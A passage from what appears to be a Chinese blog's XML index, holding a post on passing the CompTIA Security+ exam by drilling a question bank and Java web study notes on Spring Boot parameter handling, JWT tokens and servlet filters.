      <link href="/2024/03/31/%E4%B8%80%E4%B8%AA%E6%9C%88%E6%97%B6%E9%97%B4%E9%80%9A%E8%BF%87ComptiaSecurity-%E8%AE%A4%E8%AF%81%E7%9A%84%E7%BB%8F%E9%AA%8C/"/>
      <url>/2024/03/31/%E4%B8%80%E4%B8%AA%E6%9C%88%E6%97%B6%E9%97%B4%E9%80%9A%E8%BF%87ComptiaSecurity-%E8%AE%A4%E8%AF%81%E7%9A%84%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>从备考到过年到拿证，除去过年的那几天摸鱼和年前工作事情比较多之外，大概就不到一个月时间吧，总的来说考试内容比较基础，就那几块知识，加上自己有相关从业经验，所以备考并不难。</p><p>因为懒得把时间花费在研究怎么报名上，我是直接报的培训课程，因为直播课要等到五月，我就直接刷的题库，着急拿证，毕竟今年计划的重点不在security+证书上，而是后面的OSCP。</p><h1 id="学习的目标"><a href="#学习的目标" class="headerlink" title="学习的目标"></a>学习的目标</h1><p>学习的重点，不用听课程的视频部分，讲那些枯燥的概念，拿证就是要以拿证为导向去学习，直接做题库就行了，可能该方法适合我这种有一些信息安全从业经验的人，小白还是可以听一下的，一共题库900多道题，共21块知识点，涵盖应用程序安全、应急响应、无线安全等安全的大方向，题目偏理解和应用多，网络攻击方法识别那一块的题目我直接略过了，因为本身就是做网络攻击的，所以减轻了一些负担。</p><h1 id="以通过考试为导向去学习"><a href="#以通过考试为导向去学习" class="headerlink" title="以通过考试为导向去学习"></a>以通过考试为导向去学习</h1><p>学习security+，就是以题目为导向，有基础的直接做题就行了，不懂的就Google，不会把概念考的很细，只需要知道这个产品比如RADIUS、RAID、control types，这些都有哪些内容，用于什么现实场景，就可以了，我举几个例子。</p><p>RADIUS，这个在security+里，就是和无线网络的WPA2-enterprise、AAA、Active Directory紧密联系在一起的，一般看到题目里有类似的直接选就行了。</p><p>应用程序白名单，给出的场景里提到用户是通过install、run等方式启动恶意软件的，就选白名单，这个时候答案里有whitelist，必选。</p><p>captive portal，强制门户，可以起到认证用户（authentication）的功能，一般给出的场景里有网络访问的解决方案的时候，答案里有captive portal必选，只有一个例外，使用PKI对设备进行验证，选802.1x。</p><p>如此方法，多总结，就不断地把题库刷明白，做到一眼看到答案就知道要选什么，甚至不用去看题目就知道。</p><p>还有一个tip，就是实在搞不懂这里为什么选该选项的时候，就背下来，比如我这里有个选项不理解，选择用更好的决策点更新剧本（Updating the playbooks with better decision points），我就记住有playbook的必选就行了，因为题库的答案里有playbook这个单词的并不多。</p><h1 id="一定要看英文原题"><a href="#一定要看英文原题" class="headerlink" title="一定要看英文原题"></a>一定要看英文原题</h1><p>考试是全英文的，正式考试之前一定要抛开中文翻译把题目全部过一遍，常见的词汇和关键词汇要牢记，compromised、tenure等等，比如tenure，是任期的意思，有个题目就是怎么调查基于任期的网络犯罪，选mandatory vacation，要是不知道tenure的意思，那就没法做。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>考试一共82道题，满分900分，750分通过，我考了800分，一个半小时考试时间，我基本上30分钟就把题目做完了，除了两三道题不在题库里，其他的全都是很熟练的题目，看到答案直接选的那种，上午9点多考完，晚上就收到了确认邮件，第二天拿到了证书。</p><p>成绩单</p><p><a href="https://smms.app/image/xqc4ydtTbYoViKO" target="_blank"><img src="https://s2.loli.net/2024/03/31/xqc4ydtTbYoViKO.jpg" ></a></p><p>考试通过邮件</p><p><a href="https://smms.app/image/KCgx2ZoJ9NpPt6B" target="_blank"><img src="https://s2.loli.net/2024/03/31/KCgx2ZoJ9NpPt6B.png" ></a></p><p>证书</p><p><a href="https://smms.app/image/tR8axv5NQFwYMp6" target="_blank"><img src="https://s2.loli.net/2024/03/31/tR8axv5NQFwYMp6.png" ></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebDevelopmentLearningNote</title>
      <link href="/2024/03/30/JavaWeb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/30/JavaWeb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWeb中处理请求参数的方法"><a href="#JavaWeb中处理请求参数的方法" class="headerlink" title="JavaWeb中处理请求参数的方法"></a>JavaWeb中处理请求参数的方法</h1><h2 id="处理简单参数"><a href="#处理简单参数" class="headerlink" title="处理简单参数"></a>处理简单参数</h2><h3 id="简单参数方法"><a href="#简单参数方法" class="headerlink" title="简单参数方法"></a>简单参数方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>在原始的web程序中，获取请求参数，需要通过HttpServletRequest 对象手动获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定请求路径</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);<span class="comment">//参数1</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ageStr</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;age&quot;</span>);<span class="comment">//参数2</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> Integer.parseInt(ageStr);</span><br><span class="line">    System.out.println(name+<span class="string">&quot;  :  &quot;</span>+age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>利用SpringBoot方式</p><p>如果参数名与形参变量名相同，定义形参即可接收参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(String name , Integer age)</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;  :  &quot;</span>+age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述方式需要传入的参数名和形参名一致</p><p>如果方法形参名称与请求参数名称不匹配，可以使用 @RequestParam 完成映射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line"><span class="comment">//将name参数映射到username形参中</span></span><br><span class="line"><span class="comment">// @RequestParam中的required属性默认为true，代表该请求参数必须传递，如果不传递将报错。 如果该参数是可选的，可以将required属性设置为false，下面这个demo就是name必须传递，不传递就报错</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;)</span> String username , Integer age)</span>&#123;</span><br><span class="line">System.out.println(username + <span class="string">&quot; : &quot;</span> + age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实体参数方法"><a href="#实体参数方法" class="headerlink" title="实体参数方法"></a>实体参数方法</h3><p>简单参数方法，使用几个参数就要写几个形参。</p><p>简单实体对象：请求参数名与形参对象属性名相同，定义POJO接收即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/simplePojo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">simplePojo</span><span class="params">(User user)</span>&#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以嵌套</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/complexPojo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">complexPojo</span><span class="params">(User user)</span>&#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String province;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理多个同名参数"><a href="#处理多个同名参数" class="headerlink" title="处理多个同名参数"></a>处理多个同名参数</h2><p>请求参数名与形参数组名称相同且请求参数为多个，定义数组类型形参即可接收参数</p><p>如果请求为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/listParam?hobby=Q&amp;hobby=W&amp;hobby=E</span><br></pre></td></tr></table></figure><p>可以使用数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/arrayParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">arrayParam</span><span class="params">(String[] hobby)</span>&#123;    </span><br><span class="line">System.out.println(Arrays.toString(hobby));    </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用泛型集合，使用@RequestParam 绑定参数关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/listParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">listParam</span><span class="params">(<span class="meta">@RequestParam</span> List&lt;String&gt; hobby)</span>&#123;    </span><br><span class="line">System.out.println(hobby);    </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理日期参数"><a href="#处理日期参数" class="headerlink" title="处理日期参数"></a>处理日期参数</h2><p>日期参数：使用 @DateTimeFormat 注解完成日期参数格式转换</p><p>如果请求为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/dateParam?updateTime=2010-09-30 15:20:13</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/dateParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">dateParam</span><span class="params">(<span class="meta">@DateTimeFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span> LocalDateTime updateTime)</span>&#123;    </span><br><span class="line">System.out.println(updateTime);    </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理JSON参数"><a href="#处理JSON参数" class="headerlink" title="处理JSON参数"></a>处理JSON参数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;Tom&quot;</span>,</span><br><span class="line"><span class="string">&quot;age&quot;</span>:<span class="number">10</span>,</span><br><span class="line"><span class="string">&quot;address&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;province&quot;</span>:<span class="string">&quot;JP&quot;</span>,</span><br><span class="line"><span class="string">&quot;city&quot;</span>:<span class="string">&quot;Hokkaido&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jsonParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jsonParam</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;    </span><br><span class="line">System.out.println(user);    </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;    </span><br><span class="line"><span class="keyword">private</span> String name;    </span><br><span class="line"><span class="keyword">private</span> Integer age;   </span><br><span class="line"><span class="keyword">private</span> Address address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String province;</span><br><span class="line"><span class="keyword">private</span> String city;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理路径参数"><a href="#处理路径参数" class="headerlink" title="处理路径参数"></a>处理路径参数</h2><p>请求如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/path/1</span><br></pre></td></tr></table></figure><p>通过请求URL直接传递参数，使用{…}来标识该路径参数，需要使用 @PathVariable 获取路径参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/path/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">pathParam</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span>&#123;    </span><br><span class="line">System.out.println(id);    </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果请求为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/path/1/Tom</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/path/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">pathParam2</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, <span class="meta">@PathVariable</span> String name)</span>&#123;</span><br><span class="line">System.out.println(id+ <span class="string">&quot; : &quot;</span> +name);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JavaWeb中的响应"><a href="#JavaWeb中的响应" class="headerlink" title="JavaWeb中的响应"></a>JavaWeb中的响应</h1><h1 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="@ResponseBody"></a>@ResponseBody</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">类型：方法注解、类注解</span><br><span class="line"></span><br><span class="line">位置：Controller方法上/类上</span><br><span class="line"></span><br><span class="line">作用：将方法返回值直接响应，如果返回值类型是 实体对象/集合 ，将会转换为JSON格式响应</span><br><span class="line"></span><br><span class="line">说明：@RestController = @Controller + @ResponseBody ;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//控制器1</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;    </span><br><span class="line">System.out.println(<span class="string">&quot;Hello World ~&quot;</span>);    </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Hello World ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br><span class="line">Hello World ~</span><br><span class="line"></span><br><span class="line"><span class="comment">//控制器2</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/getAddr&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Address <span class="title function_">getAddr</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">Address</span> <span class="variable">addr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">addr.setProvince(<span class="string">&quot;广东&quot;</span>);</span><br><span class="line">addr.setCity(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;province&quot;</span>: <span class="string">&quot;广东&quot;</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span>: <span class="string">&quot;深圳&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//控制器3</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/listAddr&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Address&gt; <span class="title function_">listAddr</span><span class="params">()</span>&#123;</span><br><span class="line">    List&lt;Address&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Address</span> <span class="variable">addr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">    addr.setProvince(<span class="string">&quot;广东&quot;</span>);</span><br><span class="line">    addr.setCity(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line">    <span class="type">Address</span> <span class="variable">addr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">    addr2.setProvince(<span class="string">&quot;陕西&quot;</span>);</span><br><span class="line">    addr2.setCity(<span class="string">&quot;西安&quot;</span>);</span><br><span class="line">    list.add(addr);</span><br><span class="line">    list.add(addr2);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br><span class="line">[&#123;</span><br><span class="line">        <span class="string">&quot;province&quot;</span>: <span class="string">&quot;广东&quot;</span>,</span><br><span class="line">        <span class="string">&quot;city&quot;</span>: <span class="string">&quot;深圳&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">        <span class="string">&quot;province&quot;</span>: <span class="string">&quot;陕西&quot;</span>,</span><br><span class="line">        <span class="string">&quot;city&quot;</span>: <span class="string">&quot;西安&quot;</span></span><br><span class="line">  &#125;]</span><br></pre></td></tr></table></figure><p>上述的相应就很不规范，需要统一响应结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Result</span> &#123;    </span><br><span class="line"><span class="comment">//响应码，1 代表成功; 0 代表失败    </span></span><br><span class="line"><span class="keyword">private</span> Integer code;    </span><br><span class="line"><span class="comment">//提示信息    </span></span><br><span class="line"><span class="keyword">private</span> String msg;    </span><br><span class="line"><span class="comment">//返回的数据    </span></span><br><span class="line"><span class="keyword">private</span> Object data;     </span><br><span class="line"><span class="comment">//…….</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JWT令牌"><a href="#JWT令牌" class="headerlink" title="JWT令牌"></a>JWT令牌</h1><h2 id="JWT介绍"><a href="#JWT介绍" class="headerlink" title="JWT介绍"></a>JWT介绍</h2><p>JSON Web Token ，定义了一种简洁的、自包含的格式，用于在通信双方以json数据格式安全的传输信息。</p><p>由于数字签名的存在，这些信息是可靠的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">组成：</span><br><span class="line">第一部分：Header(头）， 记录令牌类型、签名算法等。 例如：&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;type&quot;:&quot;JWT&quot;&#125;</span><br><span class="line"></span><br><span class="line">第二部分：Payload(有效载荷），携带一些自定义信息、默认信息等。 例如：&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;Tom&quot;&#125;</span><br><span class="line"></span><br><span class="line">第三部分：Signature(签名），防止Token被篡改、确保安全性。将header、payload，并加入指定秘钥，通过指定签名算法计算而来。</span><br></pre></td></tr></table></figure><p><a href="https://smms.app/image/Q2gl4RdzqIFBGOa" target="_blank"><img src="https://s2.loli.net/2024/01/20/Q2gl4RdzqIFBGOa.png" alt="JWT1.png"></a></p><p>前两个部分进行base64编码，第三部分是自动生成的</p><h2 id="生成JWT令牌"><a href="#生成JWT令牌" class="headerlink" title="生成JWT令牌"></a>生成JWT令牌</h2><p>引入依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;    </span><br><span class="line">&lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;    </span><br><span class="line">&lt;artifactId&gt;jjwt&lt;/artifactId&gt;    </span><br><span class="line">&lt;version&gt;0.9.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>生成JWT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">genJwt</span><span class="params">()</span>&#123;</span><br><span class="line">Map&lt;String,Object&gt; claims = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    claims.put(“id”,<span class="number">1</span>);</span><br><span class="line">    claims.put(“username”,“Tom”);</span><br><span class="line">    <span class="type">String</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">    .setClaims(claims) <span class="comment">//自定义内容(载荷)            </span></span><br><span class="line">    .signWith(SignatureAlgorithm.HS256, “itheima”) <span class="comment">//签名算法</span></span><br><span class="line">    .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + <span class="number">12</span>*<span class="number">3600</span>*<span class="number">1000</span>)) <span class="comment">//有效期</span></span><br><span class="line">    .compact();</span><br><span class="line">    System.out.println(jwt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析JWT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parseJwt</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.parser()</span><br><span class="line">    .setSigningKey(“itheima”) <span class="comment">//指定签名秘钥  .parseClaimsJws(“eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwiZXhwIjoxNjU5OTk1NTE3LCJ1c2VybmFtZSI6IlRvbSJ9.EUTfeqPkGslekdKBezcWCe7a7xbcIIwB1MXlIccTMwo”) //解析令牌</span></span><br><span class="line">        .getBody();</span><br><span class="line">    System.out.println(claims);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JWT校验时使用的签名秘钥，必须和生成JWT令牌时使用的秘钥是一样的。</p><h1 id="过滤器Filter"><a href="#过滤器Filter" class="headerlink" title="过滤器Filter"></a>过滤器Filter</h1><p>定义Filter：定义一个类，实现 Filter 接口（不需要自己定义此接口），并重写其所有方法。</p><p>配置Filter：Filter类上加 @WebFilter 注解，配置拦截资源的路径。</p><p>引导类上加 @ServletComponentScan 开启Servlet组件支持。</p><p>init和destroy方法可以不写，默认自带</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@WebFilter注解表示匹配拦截哪个接口</span></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//初始化方法, 只调用一次</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init 初始化方法执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span 